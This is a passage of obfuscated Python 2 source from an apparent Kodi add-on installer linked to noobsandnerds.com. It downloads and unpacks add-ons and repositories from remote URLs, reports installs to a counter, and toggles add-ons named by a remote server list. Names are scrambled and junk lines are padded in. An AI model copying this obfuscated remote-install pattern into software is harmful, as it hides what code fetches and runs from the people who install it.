 OOo0oO00ooO00 ( 'folder' , 'Comics' , url + '&genre=comics' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Documentary' , url + '&genre=documentary' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Downloads' , url + '&genre=downloads' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Food' , url + '&genre=food' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Gaming' , url + '&genre=gaming' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Health' , url + '&genre=health' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'How To...' , url + '&genre=howto' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Kids' , url + '&genre=kids' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Live TV' , url + '&genre=livetv' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Movies' , url + '&genre=movies' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Music' , url + '&genre=music' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'News' , url + '&genre=news' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Photos' , url + '&genre=photos' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Podcasts' , url + '&genre=podcasts' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Radio' , url + '&genre=radio' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Religion' , url + '&genre=religion' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Space' , url + '&genre=space' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Sports' , url + '&genre=sports' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Subscription' , url + '&genre=subscription' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Technology' , url + '&genre=tech' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Trailers' , url + '&genre=trailers' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'TV Shows' , url + '&genre=tv' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Misc.' , url + '&genre=other' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 if 81 - 81: Oo00oo0oO . o0ii1I / OoOo0o
 if I1IiiI . getSetting ( 'adult' ) == 'true' :
  OOo0oO00ooO00 ( 'folder' , 'XXX' , url + '&genre=adult' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
  if 17 - 17: i11iIiiIii - II11iIiIIIiI . Oo00oo0oO % IIii1I + o0o - i11Iii
  if 78 - 78: o0o * Iii . OOO0O0O0ooooo / OOO0O0O0ooooo
def OooOOOo0 ( name , zip_link , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 forum = str ( forum )
 repo_id = str ( repo_id )
 O0O0o0o0o = 1
 IIIIIiI = 1
 Oo0000O0OOooO = 1
 O00OO = xbmc . translatePath ( os . path . join ( i1iiIII111ii , addon_id ) )
 if 65 - 65: O00ooooo00 . II1 * IIIIiiII111 / Oo00oo0oO
 if os . path . exists ( O00OO ) :
  OOOooo0OooOoO = 1
  if 91 - 91: oooOooOOo0OO + o000O0o
 else :
  OOOooo0OooOoO = 0
  if 59 - 59: o000O0o + i11iIiiIii + O00ooooo00 / o0o
 I11iIiI1 = xbmc . translatePath ( os . path . join ( I11i1I1I , name + '.zip' ) )
 oo0oooOo = xbmc . translatePath ( os . path . join ( i1iiIII111ii , addon_id ) )
 if 59 - 59: OoOo0o - o0ii1I - i11Iii
 I11 . create ( "Installing Addon" , "Please wait whilst your addon is installed" , '' , '' )
 if 48 - 48: O00ooooo00 + o0o % Iii / iiII11i1I1IIi - o0ii1I
 try :
  downloader . download ( repo_link , I11iIiI1 , I11 )
  extract . all ( I11iIiI1 , i1iiIII111ii , I11 )
  if 67 - 67: oooOooOOo0OO % o0ii1I . II1 + II11iIiIIIiI * o0o * Iii
 except :
  if 36 - 36: OOO0O0O0ooooo + iiII11i1I1IIi
  try :
   downloader . download ( zip_link , I11iIiI1 , I11 )
   extract . all ( I11iIiI1 , i1iiIII111ii , I11 )
   if 5 - 5: iiII11i1I1IIi * Iii
  except :
   if 46 - 46: i11Iii
   try :
    if not os . path . exists ( oo0oooOo ) :
     os . makedirs ( oo0oooOo )
     if 33 - 33: ooo0O0O00 - Ooo00oOo0oOo * II1 - iiII11i1I1IIi - II11iIiIIIiI
    Ii1iI111II1I1 = oOOOOoOO0o ( data_path , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    O0OO0O = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( Ii1iI111II1I1 )
    if 49 - 49: IIii1I - OOO0O0O0ooooo . O00ooooo00 - II1
    for Ii1 in O0OO0O :
     ooo0ooO = xbmc . translatePath ( os . path . join ( oo0oooOo , Ii1 ) )
     if 17 - 17: oOoO0o00OO0 . Ooo00oOo0oOo . i11Iii / oOoO0o00OO0
     if addon_id not in Ii1 and '/' not in Ii1 :
      if 57 - 57: o0o
      try :
       I11 . update ( 0 , "Downloading [COLOR=yellow]" + Ii1 + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( data_path + Ii1 , ooo0ooO , I11 )
       if 67 - 67: o0oo . i11Iii
      except :
       print "failed to install" + Ii1
       if 87 - 87: oooOooOOo0OO % IIIIiiII111
     if '/' in Ii1 and '..' not in Ii1 and 'http' not in Ii1 :
      oo0OOOoOo = data_path + Ii1
      IIiiIIi1 ( ooo0ooO , oo0OOOoOo )
      if 51 - 51: Iii
   except :
    i11 . ok ( "Error downloading add-on" , 'There was an error downloading [COLOR=yellow]' + name , '[/COLOR]Please consider updating the add-on portal with details or report the error on the forum at WWW.NOOBSANDNERDS.COM' )
    O0O0o0o0o = 0
    if 14 - 14: Oo00oo0oO % oooOooOOo0OO % iiII11i1I1IIi - i11iIiiIii
 if O0O0o0o0o == 1 :
  time . sleep ( 1 )
  I11 . update ( 0 , "[COLOR=yellow]" + name + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing repository' )
  time . sleep ( 1 )
  o0OO000ooOo = xbmc . translatePath ( os . path . join ( i1iiIII111ii , repo_id ) )
  if 86 - 86: o0oo * II1
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( o0OO000ooOo ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   OooO0oOo ( repo_id )
   if 66 - 66: o0oo * iiII11i1I1IIi
  xbmc . sleep ( 2000 )
  if 28 - 28: o0oo % Iii % oOoO0o00OO0 + o000O0o / o000O0o
  if os . path . exists ( O00OO ) and OOOooo0OooOoO == 0 :
   OO0O0ooOOO00 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   try :
    oOOOOoOO0o ( OO0O0ooOOO00 )
   except :
    pass
    if 17 - 17: OOO0O0O0ooooo . OoOo0o . OOO0O0O0ooooo + OOO0O0O0ooooo / iiII11i1I1IIi . i11Iii
  OO00OOoO0o ( name , addon_id )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  xbmc . executebuiltin ( 'Container.Refresh' )
  if 4 - 4: O00ooooo00 - i11iIiiIii / i11iIiiIii / II1
  if IIIIIiI == 0 :
   i11 . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing the repository.' , 'This will mean the add-on fails to update' )
   if 100 - 100: iiII11i1I1IIi + o0ii1I - OOO0O0O0ooooo % Ooo00oOo0oOo . ooo0O0O00
  if Oo0000O0OOooO == 0 :
   i11 . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing modules.' , 'This could result in errors with the add-on.' )
   if 92 - 92: Ooo00oOo0oOo * II1 - OoOo0o
  if Oo0000O0OOooO != 0 and IIIIIiI != 0 and forum != 'None' :
   i11 . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]Support for this add-on can be found at [COLOR=yellow]' + forum , '[/COLOR][CR]Visit WWW.NOOBSANDNERDS.COM for all your Kodi needs.' )
   if 58 - 58: IIii1I + OOO0O0O0ooooo
  if Oo0000O0OOooO != 0 and IIIIIiI != 0 and forum == 'None' :
   i11 . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]No details of forum support have been given.' )
   if 30 - 30: i11Iii % ooo0O0O00 * II11iIiIIIiI - oOoO0o00OO0 * IIIIiiII111 % i11Iii
   if 46 - 46: i11iIiiIii - OOO0O0O0ooooo . oooOooOOo0OO
def Oo0OIi11 ( addon_id ) :
 try :
  xbmcaddon . Addon ( id = addon_id ) . getAddonInfo ( 'path' )
  return True
 except :
  return False
  if 8 - 8: iiII11i1I1IIi + Ooo00oOo0oOo * II11iIiIIIiI * Iii * o0o / Oo00oo0oO
  if 21 - 21: oooOooOOo0OO / II1
def III1IiIII1 ( addon_id ) :
 OO0O0ooOOO00 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
 try :
  oOOOOoOO0o ( OO0O0ooOOO00 , 10 )
 except :
  pass
  if 90 - 90: i11Iii + Ooo00oOo0oOo * oOoO0o00OO0 / IIIIiiII111 . o0ii1I + o0ii1I
  if 40 - 40: i11Iii / Iii % i11iIiiIii % oOoO0o00OO0 / o000O0o
def ooOOOOo0 ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 if 38 - 38: II1 / oOoO0o00OO0 . OOO0O0O0ooooo / O00ooooo00 / iiII11i1I1IIi + IIii1I
 if 96 - 96: ooo0O0O00
 if Oo0OIi11 ( repo_id ) and not Oo0OIi11 ( addon_id ) :
  xbmc . log ( 'Repo exists: %s' % repo_id )
  xbmc . executebuiltin ( 'XBMC.RunPlugin(plugin://%s)' % addon_id )
  if 18 - 18: ooo0O0O00 * o0o - IIIIiiII111
  if 31 - 31: iiII11i1I1IIi - OOO0O0O0ooooo % Iii % oooOooOOo0OO
  iI1iii = OOOo ( 'yesnodialog' )
  if 79 - 79: Iii % Oo00oo0oO % iiII11i1I1IIi
  if 29 - 29: II1 . o000O0o % oOoO0o00OO0 - ooo0O0O00
  if OOOo ( 'okdialog' ) :
   xbmc . log ( '### Kodi failed to install add-on' )
   return
   if 8 - 8: O00ooooo00
   if 32 - 32: oooOooOOo0OO / Ooo00oOo0oOo
  OOOo ( 'progressdialog' )
  xbmc . sleep ( 2000 )
  if Oo0OIi11 ( addon_id ) :
   III1IiIII1 ( addon_id )
   xbmc . executebuiltin ( 'Container.Refresh' )
  elif iI1iii :
   i11 . ok ( 'UNABLE TO INSTALL' , 'The most common cause for this is you either have a bad repo or module installed somewhere on your system or this add-on is not designed for the version of Kodi you\'re running.' )
  else :
   i11 . ok ( 'UNABLE TO INSTALL' , 'The most common cause for this is the add-on is no longer available on the repo. If you find an alternative repo that has it please consider updating the team at noobsandnerds.com so they can fix in the database.' )
   if 45 - 45: oOoO0o00OO0 + o0oo * i11iIiiIii / II11iIiIIIiI % o0o * OOO0O0O0ooooo
   if 17 - 17: OOO0O0O0ooooo
 else :
  if Oo0OIi11 ( addon_id ) :
   if i11 . yesno ( 'Add-on Already Installed' , 'This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.' ) :
    O00OO = xbmcaddon . Addon ( id = addon_id ) . getAddonInfo ( 'path' )
    if 88 - 88: iiII11i1I1IIi . OOO0O0O0ooooo % II1 / II11iIiIIIiI
    if 89 - 89: Ooo00oOo0oOo / oooOooOOo0OO
    if 14 - 14: II11iIiIIIiI . o000O0o * i11Iii + Ooo00oOo0oOo - i11Iii + II11iIiIIIiI
    xbmc . executebuiltin ( "XBMC.RunPlugin(plugin://%s)" % addon_id )
    xbmc . sleep ( 2000 )
    xbmc . executebuiltin ( "ActivateWindow(10146)" )
    IIIIIiII1 = xbmcgui . Window ( 10146 )
    xbmc . sleep ( 1000 )
    xbmc . executebuiltin ( "Control.SetFocus(10146,6)" )
    xbmc . executebuiltin ( "Action(Select)" )
    if 45 - 45: o000O0o / ooo0O0O00 . ooo0O0O00
    if 35 - 35: OoOo0o . Iii * i11iIiiIii
    if 44 - 44: i11iIiiIii / iiII11i1I1IIi
   else :
    return
    if 42 - 42: II1 + iiII11i1I1IIi % Ooo00oOo0oOo + o0oo
  if ( repo_id != 'repository.xbmc.org' ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   I11i11I1iiII = OooO0oOo ( repo_id )
   if I11i11I1iiII :
    xbmc . executebuiltin ( 'XBMC.RunPlugin(plugin://%s)' % addon_id )
    iI1iii = OOOo ( 'yesnodialog' )
    OOOo ( 'progressdialog' )
    if Oo0OIi11 ( addon_id ) :
     III1IiIII1 ( addon_id )
     xbmc . executebuiltin ( 'Container.Refresh' )
    elif iI1iii :
     i11 . ok ( 'UNABLE TO INSTALL' , 'The most common cause for this is you either have a bad repo or module installed somewhere on your system or this add-on is not designed for the version of Kodi you\'re running.' )
    else :
     i11 . ok ( 'UNABLE TO INSTALL' , 'The most common cause for this is the add-on is no longer available on the repo. If you find an alternative repo that has it please consider updating the team at noobsandnerds.com so they can fix in the database.' )
     if 28 - 28: i11iIiiIii / o0ii1I . IIii1I / Ooo00oOo0oOo
     if 72 - 72: II1 / o000O0o + IIIIiiII111 / Iii * IIIIiiII111
     if 34 - 34: OOO0O0O0ooooo * OOO0O0O0ooooo % II1 + ooo0O0O00 * IIii1I % IIIIiiII111
     if 25 - 25: o0o + Iii . o0ii1I % Iii * II11iIiIIIiI
     if 32 - 32: i11iIiiIii - OoOo0o
     if 53 - 53: II1 - Oo00oo0oO
     if 87 - 87: oooOooOOo0OO . o000O0o
     if 17 - 17: IIIIiiII111 . i11iIiiIii
     if 5 - 5: oOoO0o00OO0 + OOO0O0O0ooooo + OOO0O0O0ooooo . OoOo0o - i11Iii
     if 63 - 63: oooOooOOo0OO
     if 71 - 71: O00ooooo00 . IIIIiiII111 * ooo0O0O00 % II1 + II11iIiIIIiI
     if 36 - 36: Oo00oo0oO
     if 49 - 49: II11iIiIIIiI / II1 / o000O0o
     if 74 - 74: OoOo0o % oOoO0o00OO0
     if 7 - 7: Ooo00oOo0oOo
     if 27 - 27: oooOooOOo0OO . II1 + i11iIiiIii
     if 86 - 86: o0o / o0ii1I - o0ii1I + oOoO0o00OO0 + oooOooOOo0OO
     if 33 - 33: o0ii1I . ooo0O0O00 . Oo00oo0oO . O00ooooo00
     if 49 - 49: oOoO0o00OO0
     if 84 - 84: o0o - iiII11i1I1IIi / OOO0O0O0ooooo - OoOo0o
     if 21 - 21: OOO0O0O0ooooo * OOO0O0O0ooooo % oOoO0o00OO0
     if 94 - 94: o0o + Ooo00oOo0oOo % i11iIiiIii
     if 8 - 8: i11Iii * OOO0O0O0ooooo
     if 73 - 73: o0ii1I / oooOooOOo0OO / o0o / o0oo
     if 11 - 11: Iii + Oo00oo0oO - II1 / o0oo
     if 34 - 34: i11Iii
     if 45 - 45: i11Iii / iiII11i1I1IIi / IIIIiiII111
     if 44 - 44: oOoO0o00OO0 - IIIIiiII111 / Ooo00oOo0oOo * o0oo * iiII11i1I1IIi
     if 73 - 73: o0ii1I - o000O0o * O00ooooo00 / i11iIiiIii * II11iIiIIIiI % Ooo00oOo0oOo
     if 56 - 56: II1 * iiII11i1I1IIi . iiII11i1I1IIi . oOoO0o00OO0
     if 24 - 24: iiII11i1I1IIi . o0o * IIIIiiII111 % ooo0O0O00 / II11iIiIIIiI
     if 58 - 58: o000O0o - oOoO0o00OO0 % OOO0O0O0ooooo . o000O0o % o0oo % Oo00oo0oO
     if 87 - 87: oooOooOOo0OO - i11iIiiIii
     if 78 - 78: i11iIiiIii / IIii1I - o0ii1I
     if 23 - 23: o0o
     if 40 - 40: o0ii1I - Ooo00oOo0oOo / iiII11i1I1IIi
     if 14 - 14: oOoO0o00OO0
     if 5 - 5: o0ii1I . IIii1I % IIii1I
     if 56 - 56: II1 - o0o - O00ooooo00
     if 8 - 8: OoOo0o / II11iIiIIIiI . o000O0o + oOoO0o00OO0 / i11iIiiIii
     if 31 - 31: i11Iii - IIii1I + ooo0O0O00 . iiII11i1I1IIi / Oo00oo0oO % IIii1I
     if 6 - 6: Oo00oo0oO * i11iIiiIii % IIii1I % i11iIiiIii + o0ii1I / O00ooooo00
     if 53 - 53: o0o + IIii1I
   else :
    i11 . ok ( 'Failed Install' , 'The repository could not be installed, the developer may have deleted it. Please try the backup install option.' )
    if 70 - 70: oOoO0o00OO0
    if 67 - 67: II1
def IiIiIi1I1 ( sign ) :
 OOo0oO00ooO00 ( 'folder' , '[COLOR=gold]Popular[/COLOR] (Show the top 100 most downloaded add-ons)' , 'popular' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=gold]Brand New[/COLOR] (Show the new releases)' , 'latest' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=gold]Manual Search[/COLOR] (Type in author/name/content)' , 'desc=' , 'search_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Filter Results (By Genres)' , 'p' , 'addon_genres' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Filter Results (By Countries)' , 'p' , 'addon_countries' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Filter Results (By Kodi Categories)' , 'p' , 'addon_categories' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Kodi Add-on Browser (Install From Zip)' , '' , 'install_from_zip' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Kodi Add-on Browser (Browse My Repositories)' , '' , 'browse_repos' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Kodi Add-on Browser (Check For Add-on Updates)' , '' , 'check_updates' , 'mainmenu/addons.png' , '' , '' , '' )
 if 2 - 2: O00ooooo00 - i11Iii + o000O0o . o0ii1I * o0ii1I / Iii
 if 93 - 93: O00ooooo00
def ooOOOo ( ) :
 OO000oOoo0O = [ ]
 iIIiii11iIiiI = [ ]
 O0Oo0 = [ ]
 o0oO0oo0000OO = [ ]
 I1i1ii1IiIii = [ ]
 if 69 - 69: Iii % oooOooOOo0OO - o0o
 for file in os . listdir ( i1iiIII111ii ) :
  if os . path . isdir ( os . path . join ( i1iiIII111ii , file ) ) and os . path . exists ( os . path . join ( i1iiIII111ii , file , 'addon.xml' ) ) :
   if 38 - 38: IIii1I + i11iIiiIii / i11iIiiIii % o0oo / i11Iii % IIIIiiII111
   if 7 - 7: Oo00oo0oO * o000O0o + O00ooooo00 + i11iIiiIii + iiII11i1I1IIi % o000O0o
   o0o0O0O00oOOo = open ( os . path . join ( i1iiIII111ii , file , 'addon.xml' ) , 'r' )
   oOo0O = o0o0O0O00oOOo . read ( )
   o0o0O0O00oOOo . close ( )
   OO00OO0o0 = re . compile ( 'id="(.+?)"' ) . findall ( oOo0O ) [ 0 ]
   if 52 - 52: oOoO0o00OO0 % oooOooOOo0OO - i11iIiiIii
   try :
    i1III = xbmcaddon . Addon ( OO00OO0o0 )
    I1I = i1III . getAddonInfo ( 'type' ) . replace ( 'xbmc.' , '' )
    OOo0 = i1III . getAddonInfo ( 'name' )
    o00oOOoO0oO = i1III . getAddonInfo ( 'icon' )
    OOO0oOoO0O = i1III . getAddonInfo ( 'description' )
    ooo0ooO = os . path . join ( i1iiIII111ii , file )
    if 26 - 26: IIIIiiII111 * IIii1I % o0oo . o0ii1I + iiII11i1I1IIi
    OO000oOoo0O . append ( '[COLOR=gold]%s:[/COLOR]  %s' % ( I1I , OOo0 ) )
    iIIiii11iIiiI . append ( o00oOOoO0oO )
    O0Oo0 . append ( OOO0oOoO0O )
    o0oO0oo0000OO . append ( ooo0ooO )
    if 80 - 80: iiII11i1I1IIi * IIIIiiII111 + oOoO0o00OO0 * II11iIiIIIiI
   except :
    xbmc . log ( '### Add-on Disabled, cannot remove until reactivated: %s' % file )
    if 16 - 16: o0o / o000O0o + o0oo % IIii1I - O00ooooo00 . oooOooOOo0OO
 iIi1iIIIiIiI = OooOo000o0o ( 'Add-ons To Fully Remove' , OO000oOoo0O , iIIiii11iIiiI , O0Oo0 )
 for O0oO0 in iIi1iIIIiIiI :
  iI1I1iII1i = o0oO0oo0000OO [ O0oO0 ]
  iiIIii = OO000oOoo0O [ O0oO0 ]
  I1i1ii1IiIii . append ( [ iiIIii , iI1I1iII1i ] )
 if len ( I1i1ii1IiIii ) > 0 :
  oO0Oo0O0 ( I1i1ii1IiIii )
  if 49 - 49: i11Iii * oooOooOOo0OO / o0ii1I / iiII11i1I1IIi * IIii1I
  if 57 - 57: Iii - oooOooOOo0OO / i11Iii % i11iIiiIii
def I11oOOooo ( ) :
 I1IiiI . openSettings ( sys . argv [ 0 ] )
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 80 - 80: o000O0o - i11iIiiIii
 if 69 - 69: oooOooOOo0OO % II1 . o000O0o
def I1III1II1I11 ( value ) :
 IIi11 = oOOOOoOO0o ( 'http://noobsandnerds.com/TI/AddonPortal/adult.php' , 10 )
 ooo0O0OOO000o = re . compile ( 'i="(.+?)"' ) . findall ( IIi11 )
 if 4 - 4: O00ooooo00 + i11Iii + O00ooooo00
 for oO0oo in ooo0O0OOO000o :
  oO0oo = '"%s"' % oO0oo
  i11IiIIi11I = '{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}, "id":1}' % ( oO0oo , value )
  o000o0O0Oo00 = xbmc . executeJSONRPC ( i11IiIIi11I )
  xbmc . log ( i11IiIIi11I )
  xbmc . log ( '### RETURN %s' % o000o0O0Oo00 )
  if 60 - 60: Iii
 if value == 'false' :
  IiIi1iiii = 'disabled'
 else :
  IiIi1iiii = 'enabled'
 i11 . ok ( 'ADULT CONTENT %s' % IiIi1iiii . upper ( ) , 'Your adult rated add-ons have now been %s' % IiIi1iiii )
 if 45 - 45: IIii1I
def iIiIii1ii ( ) :
 oOo0O = IIiI1i ( )
 iII1 = re . compile ( 'External storage path = (.+?);' ) . findall ( oOo0O )
 iII1 = iII1 [ 0 ] if ( len ( iII1 ) > 0 ) else ''
 return iII1
 if 70 - 70: ooo0O0O00 / II11iIiIIIiI % i11Iii - IIIIiiII111
 if 47 - 47: ooo0O0O00
def o00Ooo0 ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 O0O00O = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 iIi1Ii = len ( sourcefile )
 IiI1IIIII1I = [ ]
 I1I1IiIi1 = [ ]
 if 58 - 58: Iii - ooo0O0O00 - II1
 I11 . create ( message_header , message1 , message2 , message3 )
 if 96 - 96: IIii1I
 for OOOo00 , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( sourcefile ) :
  if 71 - 71: Oo00oo0oO + O00ooooo00 * iiII11i1I1IIi % iiII11i1I1IIi / iiII11i1I1IIi
  for file in oO0Ooo0OooOOo :
   I1I1IiIi1 . append ( file )
   if 55 - 55: II1 + OoOo0o + II1 * i11Iii
 oo = len ( I1I1IiIi1 )
 if 73 - 73: i11Iii + oooOooOOo0OO . o0oo
 for OOOo00 , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( sourcefile ) :
  if 46 - 46: o0oo - o0ii1I / Iii - II1 + oooOooOOo0OO
  OoIIi1iI [ : ] = [ OOOOI1iI1i11 for OOOOI1iI1i11 in OoIIi1iI if OOOOI1iI1i11 not in exclude_dirs ]
  oO0Ooo0OooOOo [ : ] = [ Oo0oO00 for Oo0oO00 in oO0Ooo0OooOOo if Oo0oO00 not in exclude_files and not 'crashlog' in Oo0oO00 and not 'stacktrace' in Oo0oO00 ]
  if 8 - 8: o000O0o % o000O0o . Iii % o0ii1I
  for file in oO0Ooo0OooOOo :
   if 47 - 47: i11Iii + Ooo00oOo0oOo % OoOo0o . o0o % oOoO0o00OO0
   try :
    IiI1IIIII1I . append ( file )
    ii11 = len ( IiI1IIIII1I ) / float ( oo ) * 100
    I11 . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % OOOOI1iI1i11 , 'Please Wait' )
    oOoo0 = os . path . join ( OOOo00 , file )
    if 2 - 2: II1
   except :
    print "Unable to backup file: " + file
    if 60 - 60: o0oo
   if not 'temp' in OoIIi1iI :
    if 81 - 81: Iii % IIIIiiII111
    if not OO0o in OoIIi1iI :
     if 87 - 87: IIii1I . II1 * Iii
     try :
      OOOoo0ooOo00O = '01/01/1980'
      Ii1i1I1 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( oOoo0 ) ) )
      if 97 - 97: OoOo0o . i11Iii - OoOo0o + o000O0o * Ooo00oOo0oOo
      if Ii1i1I1 > OOOoo0ooOo00O :
       O0O00O . write ( oOoo0 , oOoo0 [ iIi1Ii : ] )
       if 10 - 10: IIIIiiII111 + o0o % II1 - o000O0o
     except :
      print "Unable to backup file: " + file
      if 70 - 70: II11iIiIIIiI - ooo0O0O00
 O0O00O . close ( )
 I11 . close ( )
 if 2 - 2: IIii1I
 if 45 - 45: II1 / i11iIiiIii
def I11I1i1iI ( sourcefile , destfile ) :
 O0O00O = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 iIi1Ii = len ( sourcefile )
 IiI1IIIII1I = [ ]
 I1I1IiIi1 = [ ]
 if 90 - 90: Oo00oo0oO * Ooo00oOo0oOo % OoOo0o + oooOooOOo0OO
 I11 . create ( "Backing Up Files" , "Archiving..." , '' , 'Please Wait' )
 if 93 - 93: OoOo0o + IIIIiiII111
 for OOOo00 , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( sourcefile ) :
  if 33 - 33: OOO0O0O0ooooo
  for file in oO0Ooo0OooOOo :
   I1I1IiIi1 . append ( file )
   if 78 - 78: OOO0O0O0ooooo / Ooo00oOo0oOo * o0oo
 oo = len ( I1I1IiIi1 )
 if 50 - 50: II1 - IIii1I + O00ooooo00 % OoOo0o - IIii1I % OOO0O0O0ooooo
 for OOOo00 , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( sourcefile ) :
  if 58 - 58: Oo00oo0oO + IIii1I
  for file in oO0Ooo0OooOOo :
   IiI1IIIII1I . append ( file )
   ii11 = len ( IiI1IIIII1I ) / float ( oo ) * 100
   I11 . update ( int ( ii11 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   oOoo0 = os . path . join ( OOOo00 , file )
   if 65 - 65: Ooo00oOo0oOo - OoOo0o % o0ii1I - Iii * ooo0O0O00 + IIIIiiII111
   if not 'temp' in OoIIi1iI :
    if 79 - 79: i11Iii . Iii % OoOo0o - iiII11i1I1IIi
    if not OO0o in OoIIi1iI :
     if 69 - 69: i11Iii - o0ii1I . i11Iii
     import time
     OOOoo0ooOo00O = '01/01/1980'
     Ii1i1I1 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( oOoo0 ) ) )
     if 9 - 9: oooOooOOo0OO % i11iIiiIii / iiII11i1I1IIi
     if Ii1i1I1 > OOOoo0ooOo00O :
      O0O00O . write ( oOoo0 , oOoo0 [ iIi1Ii : ] )
 O0O00O . close ( )
 I11 . close ( )
 if 20 - 20: oooOooOOo0OO * OOO0O0O0ooooo + o0o - II1 . o0o
 if 60 - 60: o0ii1I . o0ii1I / ooo0O0O00
def Iio00 ( ) :
 IiI1iiII1i1i = i11 . browse ( 3 , 'Select the folder you want to scan' , 'files' , '' , False , False )
 iIi1Ii = len ( IiI1iiII1i1i )
 IiI1IIIII1I = [ ]
 I1I1IiIi1 = [ ]
 if 18 - 18: o000O0o
 I11 . create ( 'Checking File Structure' , '' , 'Please wait...' , '' )
 if 80 - 80: oOoO0o00OO0 / IIii1I % Iii
 oO000o0Oo00 = i11 . yesno ( 'Delete or Scan?' , 'Do you want to delete all filenames with special characters or would you rather just scan and view the results in the log?' , yeslabel = 'Delete' , nolabel = 'Scan' )
 if 77 - 77: IIii1I + o0oo . oOoO0o00OO0 % o0oo
 o0OooooO0O = open ( oOoOooOo0o0 , mode = 'w+' )
 OoOOO0OooO = open ( OOOO , mode = 'w+' )
 if 96 - 96: o000O0o % O00ooooo00 . o0ii1I . OOO0O0O0ooooo
